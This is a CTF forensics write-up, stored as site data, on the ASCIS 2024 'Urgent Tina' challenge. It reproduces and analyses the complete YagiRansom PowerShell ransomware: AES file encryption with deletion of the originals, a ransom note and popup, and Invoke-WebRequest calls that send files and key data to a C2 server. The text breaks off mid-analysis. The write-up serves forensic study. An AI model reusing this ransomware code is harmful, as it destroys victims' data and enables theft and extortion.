[["Map",1,2,9,10,32,33,34,35],"meta::meta",["Map",3,4,5,6,7,8],"astro-version","5.5.5","content-config-digest","704b91e33458fd3b","astro-config-digest","{\"root\":{},\"srcDir\":{},\"publicDir\":{},\"outDir\":{},\"cacheDir\":{},\"site\":\"https://z3moo.github.io\",\"compressHTML\":true,\"base\":\"/\",\"trailingSlash\":\"never\",\"output\":\"static\",\"scopedStyleStrategy\":\"attribute\",\"build\":{\"format\":\"directory\",\"client\":{},\"server\":{},\"assets\":\"_astro\",\"serverEntry\":\"entry.mjs\",\"redirects\":true,\"inlineStylesheets\":\"auto\",\"concurrency\":1},\"server\":{\"open\":false,\"host\":true,\"port\":1234,\"streaming\":true,\"allowedHosts\":[]},\"redirects\":{},\"image\":{\"endpoint\":{\"route\":\"/_image\"},\"service\":{\"entrypoint\":\"astro/assets/services/sharp\",\"config\":{}},\"domains\":[],\"remotePatterns\":[]},\"devToolbar\":{\"enabled\":false},\"markdown\":{\"syntaxHighlight\":false,\"shikiConfig\":{\"langs\":[],\"langAlias\":{},\"theme\":\"github-dark\",\"themes\":{},\"wrap\":false,\"transformers\":[]},\"remarkPlugins\":[null,null,null],\"rehypePlugins\":[[null,{\"target\":\"_blank\",\"rel\":[\"nofollow\",\"noreferrer\",\"noopener\"]}],null,null,null,[null,{\"theme\":{\"light\":\"github-light-high-contrast\",\"dark\":\"github-dark-high-contrast\"},\"transformers\":[{\"name\":\"@shikijs/transformers:notation-diff\"},{\"name\":\"@shikijs/transformers:meta-highlight\"},{\"name\":\"@rehype-pretty/transformers/copy-button\"}]}]],\"remarkRehype\":{},\"gfm\":true,\"smartypants\":true},\"security\":{\"checkOrigin\":true},\"env\":{\"schema\":{},\"validateSecrets\":false},\"experimental\":{\"clientPrerender\":false,\"contentIntellisense\":false,\"responsiveImages\":false,\"serializeConfig\":false,\"headingIdCompat\":false,\"preserveScriptOrder\":false},\"legacy\":{\"collections\":false}}","authors",["Map",11,12],"echo",{"id":11,"data":13,"filePath":22,"digest":23,"rendered":24},{"name":14,"pronouns":15,"avatar":16,"bio":17,"mail":18,"website":19,"twitter":20,"github":21},"Emile","he/him","https://gravatar.com/userimage/260113357/1020d2005cd6291727de4bc34dc827ed.webp?size=256","(-_-)","echoghi@rennalabs.xyz","https://emile.sh","https://twitter.com/echoghi","https://github.com/echoghi","src/content/authors/echo.md","8c614aa1d866e2cc",{"html":25,"metadata":26},"",{"headings":27,"localImagePaths":28,"remoteImagePaths":29,"frontmatter":30,"imagePaths":31},[],[],[],{"name":14,"pronouns":15,"avatar":16,"bio":17,"website":19,"twitter":20,"github":21,"mail":18},[],"projects",["Map"],"blog",["Map",36,37],"ascis-2024-urgent-tina-writeup",{"id":36,"data":38,"body":48,"filePath":49,"assetImports":50,"digest":53,"rendered":54},{"title":39,"description":40,"date":41,"image":42,"tags":43},"ASCIS 2024 - Urgent Tina Challenge Writeups","Writeups for Urgent Tina Forensics Challenge (ASEAN Student Contest on Information Security)",["Date","2025-04-04T00:00:00.000Z"],"__ASTRO_IMAGE_./banner.jpg",[44,45,46,47],"Forensics","Malware Forensics","Writeups","ASCIS","## Challenge Description: \r\nOur client is a pessimist, she is worried that if she does not pay the ransom in the next 8 hours, the hacker will not give her any more chance to get her data back. We are trying to reassure her because we believe that our talented experts can find the cause and restore her data in less than 8 hours.\r\n\r\nAuthor: bquanman\r\n\r\n`ASCIS{N0th1n9_1$_m0r3_pr3c10u5_7h4n_1ndEp3ndenc3_&_fr33d0m}`\r\n\r\n\r\n## Thought process\r\n### File inspection\r\nWe are given a `.pcapng` and a `.DMP` file.\r\n\r\n![Files Given](\u003C../../../assets/images/urgent-tina/Files Given.png>)\r\n_Files given_\r\n\r\n#### `.pcapng` file inspection\r\n\r\nOpening the `.pcapng` file.\r\n\r\n![Opened .pcapng file](\u003C../../../assets/images/urgent-tina/2025-04-05_00-25.png)\r\n_Opened file_\r\n\r\nLet's follow the TCP stream to check what was going on.\r\n\r\n![TCP stream](\u003C../../../assets/images/urgent-tina/2025-04-05_00-28.png)\r\n_TCP stream_\r\n\r\nIt seems to be encoded. We were given not only the `.pcapng` file but also a `.DMP` - a memory dump - maybe the encoding algorithm was in the memory dump. So let's leave the `.pcapng` there for now and inspect the memory dump.\r\n#### memdump inspection\r\nA memory dump suggests we use `Volatility`, so let's try it out.\r\n\r\n```bash\r\n┌──(d4nhwu4n㉿hide-and-seek)-[/mnt/e/CTF/UrgentTina SVATTT]\r\n└─$ vol -f update.DMP windows.filescan\r\nVolatility 3 Framework 2.11.0\r\nProgress:  100.00               PDB scanning finished\r\nUnsatisfied requirement plugins.FileScan.kernel.layer_name:\r\nUnsatisfied requirement plugins.FileScan.kernel.symbol_table_name:\r\n\r\nA translation layer requirement was not fulfilled.  Please verify that:\r\n        A file was provided to create this layer (by -f, --single-location or by config)\r\n        The file exists and is readable\r\n        The file is a valid memory image and was acquired cleanly\r\n\r\nA symbol table requirement was not fulfilled.  Please verify that:\r\n        The associated translation layer requirement was fulfilled\r\n        You have the correct symbol file for the requirement\r\n        The symbol file is under the correct directory or zip file\r\n        The symbol file is named appropriately or contains the correct banner\r\n\r\nUnable to validate the plugin requirements: ['plugins.FileScan.kernel.layer_name', 'plugins.FileScan.kernel.symbol_table_name']\r\n```\r\n\r\nHmm, the memory dump seems to be corrupted. Let's see if there's any workaround.\r\n\r\n-> After trying some popular functions, I concluded that the memory dump was corrupted.\r\n\r\n> At this point, I didn't know the memory dump was a mini-dump, so I incorrectly concluded it was corrupted when in fact it wasn't.\r\n\r\nLet's try something like `strings` and output to a file to see the memory dump content.\r\n\r\n![Memory dump content](\u003C../../../assets/images/urgent-tina/2025-04-05_01-58.png)\r\n_Strings Content_\r\n\r\nThis is fascinating. A program called `update.exe` was executed in the user's `Desktop`.\r\n\r\n```powershell\r\n\"c:\\users\\ieuser\\desktop\\update.exe\" -e c:\\users\\ieuser\\documents\\ -s 192.168.240.1 -p 443 -x\r\n```\r\n\r\n> -e c:\\users\\ieuser\\documents\\: Best guess is the program extracts the data to the `Documents` folder of the user\r\n{: .prompt-info }\r\n> -s 192.168.240.1: Maybe sends the data to a server at 192.168.240.1\r\n{: .prompt-info }\r\n> -p 443: Uses port 443\r\n{: .prompt-info }\r\n> -x: Unknown \r\n{: .prompt-info }\r\n\r\n![alt text](\u003C../../../assets/images/urgent-tina/2025-04-05_02-16.png)\r\n_Strings Content (Powershell code block)_\r\nA PowerShell sciprt block was found right below the place we found where the program was executed. The script is pretty long.\r\n\r\n```powershell\r\n# Design\r\n$ProgressPreference = \"SilentlyContinue\"\r\n$ErrorActionPreference = \"SilentlyContinue\"\r\n$OSVersion = [Environment]::OSVersion.Platform\r\nif ($OSVersion -like \"*Win*\") {\r\n$Host.UI.RawUI.WindowTitle = \"YagiRansom\" \r\n$Host.UI.RawUI.BackgroundColor = \"Black\"\r\n$Host.UI.RawUI.ForegroundColor = \"White\" }\r\n# Variables\r\n$Mode = $args[0]\r\n$Directory = $args[1]\r\n$WiETm = $args[3]\r\n$7CiB = $args[3]\r\n$UFX = $args[5]\r\n$ENyR = $args[6]\r\n$DCe = $null\r\n# Errors\r\nif ($args[0] -like \"-h*\") { break }\r\nif ($args[0] -eq $null) { Write-Host \"[!] Not enough/Wrong parameters!\" -ForegroundColor Red ; Write-Host ; break }\r\nif ($args[1] -eq $null) { Write-Host \"[!] Not enough/Wrong parameters!\" -ForegroundColor Red ; Write-Host ; break }\r\nif ($args[2] -eq $null) { Write-Host \"[!] Not enough/Wrong parameters!\" -ForegroundColor Red ; Write-Host ; break }\r\nif ($args[3] -eq $null) { Write-Host \"[!] Not enough/Wrong parameters!\" -ForegroundColor Red ; Write-Host ; break }\r\n# Proxy Aware\r\n[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()\r\n[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials\r\n$AllProtocols = [System.Net.SecurityProtocolType]\"Ssl3,Tls,Tls11,Tls12\" ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols\r\n# Functions\r\n$OgE = ([Environment]::MachineName).ToLower() ; $zVSza = ([Environment]::UserName).ToLower() ; $I26 = \"yaginote.txt\"\r\n$7VEq = Get-Date -Format \"HH:mm - dd/MM/yy\" ; $Uz19o = $7VEq.replace(\":\",\"\").replace(\" \",\"\").replace(\"-\",\"\").replace(\"/\",\"\")+$zVSza+$OgE\r\nif ($OSVersion -like \"*Win*\") { $domain = (([Environment]::UserDomainName).ToLower()+\"\\\") ; $slash = \"\\\" } else { $domain = $null ; $slash = \"/\" } \r\n$DirectoryTarget = $Directory.Split($slash)[-1] ; if (!$DirectoryTarget) { $DirectoryTarget = $Directory.Path.Split($slash)[-1] }\r\nfunction Invoke-AESEncryption {\r\n   [CmdletBinding()]\r\n   [OutputType([string])]\r\n   Param(\r\n       [Parameter(Mandatory = $true)]\r\n       [String]$Key,\r\n       [Parameter(Mandatory = $true, ParameterSetName = \"CryptText\")]\r\n       [String]$Text,\r\n       [Parameter(Mandatory = $true, ParameterSetName = \"CryptFile\")]\r\n       [String]$Path)\r\n   Begin {\r\n      $m95I = New-Object System.Security.Cryptography.SHA256Managed\r\n      $n9ibn = New-Object System.Security.Cryptography.AesManaged\r\n      $n9ibn.Mode = [System.Security.Cryptography.CipherMode]::CBC\r\n      $n9ibn.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7\r\n      $n9ibn.BlockSize = 128\r\n      $n9ibn.KeySize = 256 }\r\n   Process {\r\n      $n9ibn.Key = $m95I.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))\r\n      if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}\r\n      if ($Path) {\r\n         $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\r\n         if (!$File.FullName) { break }\r\n         $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)\r\n         $outPath = $File.FullName + \".enc\" }\r\n      $encryptor = $n9ibn.CreateEncryptor()\r\n      $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)\r\n      $encryptedBytes = $n9ibn.IV + $encryptedBytes\r\n      $n9ibn.Dispose()\r\n      if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}\r\n      if ($Path) {\r\n         [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)\r\n         (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}\r\n  End {\r\n      $m95I.Dispose()\r\n      $n9ibn.Dispose()}}\r\nfunction RemoveWallpaper {\r\n$code = @\"\r\nusing System;\r\nusing System.Drawing;\r\nusing System.Runtime.InteropServices;\r\nusing Microsoft.Win32;\r\nnamespace CurrentUser { public class Desktop {\r\n[DllImport(\"user32.dll\", SetLastError = true, CharSet = CharSet.Auto)]\r\nprivate static extern int SystemParametersInfo(int uAction, int uParm, string lpvParam, int fuWinIni);\r\n[DllImport(\"user32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\r\nprivate static extern int SetSysColors(int cElements, int[] lpaElements, int[] lpRgbValues);\r\npublic const int UpdateIniFile = 0x01; public const int SendWinIniChange = 0x02;\r\npublic const int SetDesktopBackground = 0x0014; public const int COLOR_DESKTOP = 1;\r\npublic int[] first = {COLOR_DESKTOP};\r\npublic static void RemoveWallPaper(){\r\nSystemParametersInfo( SetDesktopBackground, 0, \"\", SendWinIniChange | UpdateIniFile );\r\nRegistryKey regkey = Registry.CurrentUser.OpenSubKey(\"Control Panel\\\\Desktop\", true);\r\nregkey.SetValue(@\"WallPaper\", 0); regkey.Close();}\r\npublic static void SetBackground(byte r, byte g, byte b){ int[] elements = {COLOR_DESKTOP};\r\nRemoveWallPaper();\r\nSystem.Drawing.Color color = System.Drawing.Color.FromArgb(r,g,b);\r\nint[] colors = { System.Drawing.ColorTranslator.ToWin32(color) };\r\nSetSysColors(elements.Length, elements, colors);\r\nRegistryKey key = Registry.CurrentUser.OpenSubKey(\"Control Panel\\\\Colors\", true);\r\nkey.SetValue(@\"Background\", string.Format(\"{0} {1} {2}\", color.R, color.G, color.B));\r\nkey.Close();}}}\r\ntry { Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing.dll }\r\nfinally {[CurrentUser.Desktop]::SetBackground(250, 25, 50)}}\r\nfunction PopUpRansom {\r\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Drawing\")  \r\n[void] [System.Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\") \r\n[void] [System.Windows.Forms.Application]::EnableVisualStyles() \r\nInvoke-WebRequest -useb https://www.mediafire.com/view/wlq9mlfrlonlcuk/yagi.png/file -Outfile $env:temp\\YagiRansom.jpg\r\nInvoke-WebRequest -useb https://www.mediafire.com/file/s4qcg4hk6bnd2pe/Yagi.ico/file -Outfile $env:temp\\YagiRansom.ico\r\n$shell = New-Object -ComObject \"Shell.Application\"\r\n$shell.minimizeall()\r\n$form = New-Object system.Windows.Forms.Form\r\n$form.ControlBox = $false;\r\n$form.Size = New-Object System.Drawing.Size(900,600) \r\n$form.BackColor = \"Black\" \r\n$form.MaximizeBox = $false \r\n$form.StartPosition = \"CenterScreen\" \r\n$form.WindowState = \"Normal\"\r\n$form.Topmost = $true\r\n$form.FormBorderStyle = \"Fixed3D\"\r\n$form.Text = \"YagiRansom\"\r\n$formIcon = New-Object system.drawing.icon (\"$env:temp\\YagiRansom.ico\") \r\n$form.Icon = $formicon  \r\n$img = [System.Drawing.Image]::Fromfile(\"$env:temp\\YagiRansom.jpg\")\r\n$pictureBox = new-object Windows.Forms.PictureBox\r\n$pictureBox.Width = 920\r\n$pictureBox.Height = 370\r\n$pictureBox.SizeMode = \"StretchImage\"\r\n$pictureBox.Image = $img\r\n$form.controls.add($pictureBox)\r\n$label = New-Object System.Windows.Forms.Label\r\n$label.ForeColor = \"Cyan\"\r\n$label.Text = \"All your files have been encrypted by YagiRansom!\" \r\n$label.AutoSize = $true \r\n$label.Location = New-Object System.Drawing.Size(50,400) \r\n$font = New-Object System.Drawing.Font(\"Consolas\",15,[System.Drawing.FontStyle]::Bold) \r\n$form.Font = $Font \r\n$form.Controls.Add($label) \r\n$label1 = New-Object System.Windows.Forms.Label\r\n$label1.ForeColor = \"White\"\r\n$label1.Text = \"But don\r\nt worry, you can still recover them with the recovery key if you pay the ransom in the next 8 hours.\" \r\n$label1.AutoSize = $true \r\n$label1.Location = New-Object System.Drawing.Size(50,450)\r\n$font1 = New-Object System.Drawing.Font(\"Consolas\",15,[System.Drawing.FontStyle]::Bold) \r\n$form.Font = $Font1\r\n$form.Controls.Add($label1) \r\n$okbutton = New-Object System.Windows.Forms.Button;\r\n$okButton.Location = New-Object System.Drawing.Point(750,500)\r\n$okButton.Size = New-Object System.Drawing.Size(110,35)\r\n$okbutton.ForeColor = \"Black\"\r\n$okbutton.BackColor = \"White\"\r\n$okbutton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat\r\n$okButton.Text = 'Pay Now!'\r\n$okbutton.Visible = $false\r\n$okbutton.Enabled = $true\r\n$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK\r\n$okButton.add_Click({ \r\n[System.Windows.Forms.MessageBox]::Show($this.ActiveForm, 'Your payment order has been successfully registered!', 'YagiRansom Payment Processing System',\r\n[Windows.Forms.MessageBoxButtons]::\"OK\", [Windows.Forms.MessageBoxIcon]::\"Warning\")})\r\n$form.AcceptButton = $okButton\r\n$form.Controls.Add($okButton)\r\n$form.Activate() 2>&1> $null\r\n$form.Focus() 2>&1> $null\r\n$btn=New-Object System.Windows.Forms.Label\r\n$btn.Location = New-Object System.Drawing.Point(50,500)\r\n$btn.Width = 500\r\n$form.Controls.Add($btn)\r\n$btn.ForeColor = \"Red\"\r\n$startTime = [DateTime]::Now\r\n$count = 10.6\r\n$7VEqr=New-Object System.Windows.Forms.Timer\r\n$7VEqr.add_Tick({$elapsedSeconds = ([DateTime]::Now - $startTime).TotalSeconds ; $remainingSeconds = $count - $elapsedSeconds\r\nif ($remainingSeconds -like \"-0.1*\"){ $7VEqr.Stop() ; $okbutton.Visible = $true ; $btn.Text = \"0 Seconds remaining..\" }\r\n$btn.Text = [String]::Format(\"{0} Seconds remaining..\", [math]::round($remainingSeconds))})\r\n$7VEqr.Start()\r\n$btntest = $form.ShowDialog()\r\nif ($btntest -like \"OK\"){ $Global:PayNow = \"True\" }}\r\nfunction R64Encoder { \r\n   if ($args[0] -eq \"-t\") { $VaFQ = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }\r\n   if ($args[0] -eq \"-f\") { $VaFQ = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }\r\n   $VaFQ = $VaFQ.Split(\"=\")[0] ; $VaFQ = $VaFQ.Replace(\"C\", \"-\") ; $VaFQ = $VaFQ.Replace(\"E\", \"_\")\r\n   $8bKW = $VaFQ.ToCharArray() ; [array]::Reverse($8bKW) ; $R64Base = -join $8bKW ; return $R64Base }\r\nfunction GetStatus {\r\n   Try { Invoke-WebRequest -useb \"$7CiB`:$UFX/status\" -Method GET \r\n      Write-Host \"[i] C2 Server is up!\" -ForegroundColor Green }\r\n   Catch { Write-Host \"[!] C2 Server is down!\" -ForegroundColor Red }}\r\nfunction SendResults {\r\n   $cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf\r\n   $2YngY = \"> $cVl > $OgE > $zVSza > $7VEq\"\r\n   $RansomLogs = Get-Content \"$Directory$slash$I26\" | Select-String \"[!]\" | Select-String \"YagiRansom!\" -NotMatch\r\n   $XoX = R64Encoder -t $2YngY ; $B64Logs = R64Encoder -t $RansomLogs\r\n   Invoke-WebRequest -useb \"$7CiB`:$UFX/data\" -Method POST -Body $XoX 2>&1> $null\r\n   Invoke-WebRequest -useb \"$7CiB`:$UFX/logs\" -Method POST -Body $B64Logs 2>&1> $null }\r\nfunction SendClose {\r\n   Invoke-WebRequest -useb \"$7CiB`:$UFX/close\" -Method GET 2>&1> $null }\r\nfunction SendPay {\r\n   Invoke-WebRequest -useb \"$7CiB`:$UFX/pay\" -Method GET 2>&1> $null }\r\nfunction SendOK {\r\n   Invoke-WebRequest -useb \"$7CiB`:$UFX/done\" -Method GET 2>&1> $null }\r\nfunction CreateReadme {\r\n   $I26TXT = \"All your files have been encrypted by YagiRansom!!`nBut don't worry, you can still recover them with the recovery key if you pay the ransom in the next 8 hours.`nTo get decryption instructions, you must transfer 100000$ to the following account:`n`nAccount Name: Mat tran To quoc Viet Nam - Ban Cuu Tro Trung uong`n`nAccount Number: 0011.00.1932418`n`nBank: Vietnam Joint Stock Commercial Bank for Foreign Trade (Vietcombank)`n\"\r\n   if (!(Test-Path \"$Directory$slash$I26\")) { Add-Content -Path \"$Directory$slash$I26\" -Value $I26TXT }}\r\nfunction EncryptFiles { \r\n   $ExcludedFiles = '*.enc', 'yaginote.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'\r\n   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { \r\n   Invoke-AESEncryption -Key $WiETm -Path $i ; Add-Content -Path \"$Directory$slash$I26\" -Value \"[!] $i is now encrypted\" ;\r\n   Remove-Item $i }\r\n   $RansomLogs = Get-Content \"$Directory$slash$I26\" | Select-String \"[!]\" | Select-String \"YagiRansom!\" -NotMatch ; if (!$RansomLogs) { \r\n   Add-Content -Path \"$Directory$slash$I26\" -Value \"[!] No files have been encrypted!\" }}\r\nfunction ExfiltrateFiles {\r\n   Invoke-WebRequest -useb \"$7CiB`:$UFX/files\" -Method GET 2>&1> $null \r\n   $RansomLogs = Get-Content \"$Directory$slash$I26\" | Select-String \"No files have been encrypted!\" ; if (!$RansomLogs) {\r\n   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.enc | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {\r\n      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile\r\n      Invoke-WebRequest -useb \"$7CiB`:$UFX/files/$B64Name\" -Method POST -Body $B64file 2>&1> $null }}\r\n   else { $B64Name = R64Encoder -t \"none.null\" ; Invoke-WebRequest -useb \"$7CiB`:$UFX/files/$B64Name\" -Method POST -Body $B64file 2>&1> $null }}\r\nfunction CheckFiles { \r\n   $RFiles = Get-ChildItem $Directory -recurse -filter *.enc ; if ($RFiles) { $RFiles } else {\r\n   Write-Host \"[!] No encrypted files found!\" -ForegroundColor Red }}\r\n# Main\r\nif ($Mode -eq \"-d\") { \r\n   Write-Host ; Write-Host \"[!] Shutdowning....\" -ForegroundColor Red; sleep 1 }\r\nelse {\r\n   Write-Host ;\r\n   Write-Host \"[+] Checking communication with C2 Server..\" -ForegroundColor Blue\r\n   $DCe = GetStatus ; sleep 1\r\n   $WiETm = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})\r\n   Write-Host \"[!] Encrypting ...\" -ForegroundColor Red\r\n   CreateReadme ; EncryptFiles ; if ($DCe) { SendResults ; sleep 1\r\n   if ($ENyR -eq \"-x\") { Write-Host \"[i] Exfiltrating ...\" -ForegroundColor Green\r\n      ExfiltrateFiles ; sleep 1 }}\r\n   if (!$DCe) { Write-Host \"[+] Saving logs in yaginote.txt..\" -ForegroundColor Blue }\r\n   else { Write-Host \"[+] Sending logs to C2 Server..\" -ForegroundColor Blue }}\r\n   if ($args -like \"-demo\") { RemoveWallpaper ; PopUpRansom\r\n   if ($PayNow -eq \"True\") { SendPay ; SendOK } else { SendClose ; SendOK }}\r\n   else { SendOK }\r\nsleep 1000 ; Write-Host \"[i] Done!\" -ForegroundColor Green ; Write-Host\r\n```\r\n### PowerShell code block analysis\r\n- Section:\r\n   - `#Design`: Suppresses the PowerShell errors and messages to avoid detection, detects if the system is Windows or not. If the system is Windows, changes the terminal to `YagiRansom` and changes the background to black and foreground to white.\r\n   - `#Error`: Checks if all the required parameters are provided; if not, prints an error and exits.\r\n   - `#Proxy Aware`: Ensures the script uses the system proxy settings as well as compatibility with multiple TLS (Transport Layer Security) protocols.\r\n   - `#Functions`: There are many functions in this section.\r\n     - `$OgE`: Stores the machine name.\r\n     - `$zVSza`: Stores the username.\r\n     - `$I26`: Stores the ransom note file name.\r\n     - `Invoke-AESEncryption`: Encrypts files using AES-256 encryption. Encrypts either text (-Text) or files (-Path) and output encrypted data as a Base64 string or a new .enc file.\r\n     - `RemoveWallpaper`: Removes the desktop wallpaper and set a solid red background.\r\n     - `PopUpRansom`: Displays a ransom pop-up window and a countdown timer before enabling the `Pay Now!` button. \r\n     - `R64Encoder`: Encodes text or file contents into a Base64 format.\r\n     - `C2 Communication`: \r\n       - `GetStatus`: Checks if the C2 server is online.\r\n       - `SendResults`: Send encryption results to the C2 server.\r\n       - `SendClose`: Tell the C2 server that the process was completed.\r\n       - `SendPay`: Tell the C2 server that the ransom was paid.\r\n       - `SendOK`: Final confirmation to the C2 server.\r\n     - `CreateReadme`: Creates `yaginote.txt` with: Ransom message and Bank Account.\r\n     - `EncryptFiles`: Encrypts all files in a directory and deletes the original.\r\n     - `ExfiltrateFiles`: Uploads encrypted file to the C2 server.\r\n     - `CheckFiles`: Check if any `.enc` files exist in `$Directory`\r\n     - `Main`: Execute the main flow. \r\n  \r\n> From the code we could see the program flow will be:\r\n> 1. Check the OS, the `args` and setup proxy for the C2\r\n> 2. Generate AES key then encrypt the files and log them.\r\n> 3. Send the results, logs to the C2 and exfiltrate `.enc` files.\r\n> 4. Create a ransom `readme` note and display a GUI popup with `Pay Now!` button\r\n> 5. Notify the C2 either `OK`, `Close` or `Pay Flags`\r\n{: .prompt-tip}\r\n\r\nLet's analyze each function more carefully\r\n#### AESEncryption\r\n```powershell\r\nfunction Invoke-AESEncryption {\r\n   [CmdletBinding()]\r\n   [OutputType([string])]\r\n   Param(\r\n       [Parameter(Mandatory = $true)]\r\n       [String]$Key,\r\n       [Parameter(Mandatory = $true, ParameterSetName = \"CryptText\")]\r\n       [String]$Text,\r\n       [Parameter(Mandatory = $true, ParameterSetName = \"CryptFile\")]\r\n       [String]$Path)\r\n   Begin {\r\n      $m95I = New-Object System.Security.Cryptography.SHA256Managed\r\n      $n9ibn = New-Object System.Security.Cryptography.AesManaged\r\n      $n9ibn.Mode = [System.Security.Cryptography.CipherMode]::CBC\r\n      $n9ibn.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7\r\n      $n9ibn.BlockSize = 128\r\n      $n9ibn.KeySize = 256 }\r\n   Process {\r\n      $n9ibn.Key = $m95I.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))\r\n      if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}\r\n      if ($Path) {\r\n         $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\r\n         if (!$File.FullName) { break }\r\n         $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)\r\n         $outPath = $File.FullName + \".enc\" }\r\n      $encryptor = $n9ibn.CreateEncryptor()\r\n      $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)\r\n      $encryptedBytes = $n9ibn.IV + $encryptedBytes\r\n      $n9ibn.Dispose()\r\n      if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}\r\n      if ($Path) {\r\n         [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)\r\n         (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}\r\n  End {\r\n      $m95I.Dispose()\r\n      $n9ibn.Dispose()}}\r\n```\r\n\r\n- Param block:\r\n  ```powershell\r\n  Param(\r\n       [Parameter(Mandatory = $true)]\r\n       [String]$Key,\r\n       [Parameter(Mandatory = $true, ParameterSetName = \"CryptText\")]\r\n       [String]$Text,\r\n       [Parameter(Mandatory = $true, ParameterSetName = \"CryptFile\")]\r\n       [String]$Path)\r\n   ```\r\n  - `$Key` for encrypt and decrypt.\r\n  - `$Text` is plaintext to encrypt.\r\n  - `$Path` is path to file to encrypt.\r\n- Begin block:\r\n  ```powershell\r\n  Begin {\r\n      $m95I = New-Object System.Security.Cryptography.SHA256Managed\r\n      $n9ibn = New-Object System.Security.Cryptography.AesManaged\r\n      $n9ibn.Mode = [System.Security.Cryptography.CipherMode]::CBC\r\n      $n9ibn.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7\r\n      $n9ibn.BlockSize = 128\r\n      $n9ibn.KeySize = 256 }\r\n   ```\r\n   - Create SHA256 hash \r\n   - Set AES encryption to `CBC` with `PKCS7` and `256 bit` key. Block Size is `128 bit`\r\n- Process block:\r\n  ```powershell\r\n  Process {\r\n      $n9ibn.Key = $m95I.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))\r\n      if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}\r\n      if ($Path) {\r\n         $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\r\n         if (!$File.FullName) { break }\r\n         $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)\r\n         $outPath = $File.FullName + \".enc\" }\r\n      $encryptor = $n9ibn.CreateEncryptor()\r\n      $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)\r\n      $encryptedBytes = $n9ibn.IV + $encryptedBytes\r\n      $n9ibn.Dispose()\r\n      if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}\r\n      if ($Path) {\r\n         [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)\r\n         (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}\r\n   ```\r\n   - First it hashes the `$Key` using `SHA-256` and stores it in `$n9ibn`\r\n   - If `$Text` is provided, it encrypts it\r\n   - If `$Path` is provided, it reads the file's bytes and encrypts them\r\n   - It creates an AES Encryptor with the key and a random IV\r\n   - Encrypts the plaintext bytes and stores them in `$encryptedBytes`\r\n   - The IV is added to the encrypted data\r\n   - Return `base64` encoded text or file\r\n   - Clean up AES resources\r\n#### R64Encoder\r\n```powershell\r\nfunction R64Encoder { \r\n   if ($args[0] -eq \"-t\") { $VaFQ = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }\r\n   if ($args[0] -eq \"-f\") { $VaFQ = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }\r\n   $VaFQ = $VaFQ.Split(\"=\")[0] ; $VaFQ = $VaFQ.Replace(\"C\", \"-\") ; $VaFQ = $VaFQ.Replace(\"E\", \"_\")\r\n   $8bKW = $VaFQ.ToCharArray() ; [array]::Reverse($8bKW) ; $R64Base = -join $8bKW ; return $R64Base }\r\n```\r\n- Takes `$args` as input\r\n  - If `$args[0]` is \"-t\", converts the text in `$args[1]` to bytes using UTF-8, then encodes it using base64 and stores it in `$VaFQ`\r\n  - If `$args[0]` is \"-f\", reads the file in `$args[1]`, converts it to bytes, then encodes it using base64 and stores it in `$VaFQ`\r\n  - Removes the padding character \"=\" from base64 and replaces \"C\" with \"-\" as well as \"E\" with \"_\"\r\n  - Converts `$VaFQ` to a character array stored in `$8bKW`, reverses the array, then joins all characters to create and return `$R64Base`\r\n#### SendResults\r\n```powershell\r\nfunction SendResults {\r\n   $cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf\r\n   $2YngY = \"> $cVl > $OgE > $zVSza > $7VEq\"\r\n   $RansomLogs = Get-Content \"$Directory$slash$I26\" | Select-String \"[!]\" | Select-String \"YagiRansom!\" -NotMatch\r\n   $XoX = R64Encoder 